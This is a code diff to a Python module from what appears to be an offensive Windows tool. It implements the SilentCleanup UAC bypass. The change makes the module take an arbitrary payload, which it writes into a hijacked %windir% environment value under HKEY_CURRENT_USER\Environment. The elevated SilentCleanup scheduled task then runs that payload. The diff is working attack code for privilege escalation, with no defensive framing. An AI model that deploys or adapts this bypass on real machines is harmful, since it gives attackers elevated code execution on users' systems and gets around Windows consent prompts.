@@ -10,7 +10,7 @@ from core.prints import *
 
 wmi = wmi.WMI()
 
-def silentcleanup():
+def silentcleanup(payload):
 	print """
  -------------------------------------------------------------
  SilentCleanup is a preconfigured scheduled task that is
@@ -26,11 +26,11 @@ def silentcleanup():
  "cmd.exe /k" that will run.
  -------------------------------------------------------------
  """
-	print_info("Payload: cmd.exe /k")
+	print_info("Payload: {}".format(payload))
 	print_info("Hijacking %windir% enviroment variable in HKCU\Environment")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Environment"))			
-		_winreg.SetValueEx(key,"windir",0,_winreg.REG_SZ,"cmd.exe /k")
+		_winreg.SetValueEx(key,"windir",0,_winreg.REG_SZ,"cmd.exe /k {} & ".format(payload))
 		_winreg.CloseKey(key)
 	except Exception as error:
 		print_error("Unable to create %windir% enviroment variable in HKEY_CURRENT_USER\Environment")
